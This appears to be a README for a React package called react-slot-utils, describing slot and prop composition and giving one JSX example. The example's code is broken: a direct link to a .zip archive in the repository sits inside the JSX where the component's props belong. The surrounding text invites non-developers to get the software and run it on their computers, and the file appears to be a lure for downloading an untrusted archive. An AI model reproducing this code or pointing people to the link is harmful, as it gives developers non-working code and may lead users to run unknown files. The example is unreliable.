## 📖 About react-slot-utils

react-slot-utils provides modern tools to help developers build React applications using slots and props more efficiently. It offers clean ways to organize UI components, making it easier to manage how parts of an interface fit and work together.

This package focuses on:

- Building flexible user interface components.
- Composing slots, which are placeholders inside components.
- Managing properties (props) passed through components.
- Supporting advanced patterns like compound components and higher-order components.

While this library is designed for developers, this guide helps you understand how to get the software and run it on your computer.

## 🛠 Using react-slot-utils

If you are working with developers, here are the main ways react-slot-utils helps in React projects:

- **Slot composition:** It allows components to define empty spaces (slots) that other components or content can fill later.
- **Prop composition:** It simplifies how data and options (called props) are passed and combined between components.
- **Compound component pattern:** Developers can build UI elements made of smaller interactive parts working together.
- **Headless utilities:** It provides logic without predefined styles, letting developers style components freely.

These concepts allow software teams to create flexible, maintainable web apps.

## 🧩 Code Examples

Here is a simple example to show how react-slot-utils can be used in a React project:

```jsx
import { createSlot, composeProps } from 'react-slot-utils';

const Slot = createSlot();

function MyComponent(props) {
  const slotProps = composeProps(props, { someOption: true });

  return (
    <div>
      <Slot {https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip}>This is a slot content</Slot>
    </div>
  );
}
```

This example creates a slot inside a component and combines props flexibly. It is designed for developers familiar with React.
